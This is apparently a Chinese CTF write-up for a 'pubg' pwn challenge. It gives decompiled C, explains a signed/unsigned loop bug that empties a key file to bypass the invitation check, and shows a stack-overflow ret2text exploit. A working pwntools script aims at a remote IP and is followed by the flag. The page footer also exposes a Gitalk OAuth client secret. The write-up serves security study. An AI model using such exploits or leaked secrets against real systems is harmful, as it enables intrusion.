+激活的逻辑是,判断是否存在key.txt，不存在则从<code>/dev/urandom</code>读取16字节并写入
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">sub_401E99</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">days</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-D4h]</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-D0h]</span>
+  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-C0h]</span>
+  <span class="kt">char</span> <span class="n">ptr</span><span class="p">;</span> <span class="c1">// [rsp+90h] [rbp-50h]</span>
+  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+A0h] [rbp-40h]</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [rsp+D0h] [rbp-10h]</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+D8h] [rbp-8h]</span>
+
+  <span class="n">s</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;./key.txt&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">s</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;./key.txt&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">);</span>
+    <span class="n">stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;/dev/urandom&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">stream</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">perror</span><span class="p">(</span><span class="s">&quot;fopen&quot;</span><span class="p">);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>                                  <span class="c1">// write key file</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;./key.txt&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
+  <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+  <span class="n">fclose</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;please input your subscripton time(days):&quot;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">days</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">days</span> <span class="o">&gt;</span> <span class="mi">7</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;could not subscibe for over a week&quot;</span><span class="p">);</span>
+  <span class="n">sub_401DDC</span><span class="p">(</span><span class="n">days</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;./key.txt&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>
+  <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+  <span class="n">fclose</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;please input your invitation code:&quot;</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">sub_401BA0</span><span class="p">();</span>
+    <span class="n">handler</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;wrong code&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+程序输入只有days可控，观察函数<code>sub_401DDC</code>可以发现<code>unsigned int</code>和<code>int</code>做了比较，那么当day为负数的时候，for循环就会超时，最后被预先设置的<code>alarm</code>中止，由于fopen的特性，key.txt文件就会被清空。那么在下一步只需输入16个0x00即可绕过验证。
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_401DDC</span><span class="p">(</span><span class="kt">int</span> <span class="n">day</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-50h]</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-10h]</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+5Ch] [rbp-4h]</span>
+
+  <span class="n">stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;./key.txt&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">day</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>
+    <span class="n">sub_401B55</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">ptr</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>
+    <span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">fwrite</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">fclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+绕过验证后到达函数<code>sub_401BA0</code>，很简单的一个栈溢出，将ret改写为后门即可。
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">sub_401BA0</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h]</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please input your name:&quot;</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x60uLL</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Lisence created.&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+exp如下，需要注意的是由于只有5秒时间- -,getshell后需要立即<code>cat flag</code>(懒得再写脚本了)
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="c1">#p=process(&#39;./pubg&#39;)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;159.65.68.241&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;-2&#39;</span><span class="p">)</span> <span class="c1">#crash</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="c1">#p=process(&#39;./pubg&#39;)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;159.65.68.241&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401BED</span><span class="p">))</span> <span class="c1">#ret2text</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+flag{L3H_h3r3_1s_y0ur_ch1cken_dinner}</p>
+                
+                  
+                
+              
+              
+                <!-- Set from config but allow override -->
+   
+
+<hr>
+<blockquote class="page-copyright">
+    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
+</blockquote>
+<!-- Comments Integration -->
+ 
+<h2 id="__comments">评论</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+    clientID: 'de7da411f088d04c1171',
+    clientSecret: 'de998d1fa46f3e4b128c578b824a2ffbc8100b66',
+    repo: 'blogComment',
+        owner: 'Windforce17',
+        admin: ['Windforce17'],
+        id: md5(location.pathname), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script> 
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../catalyst/" title="Catalyst" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                Catalyst
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../../../ics/发现/" title="发现" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                发现
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2016 - 2018 Windforce17
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/application.955ddd4c.js"></script>
+      
+        
+        
+          
+          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      
+        <script src="../../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+        <script src="../../../../search/main.js"></script>
+      
+    
+  </body>
+</html>
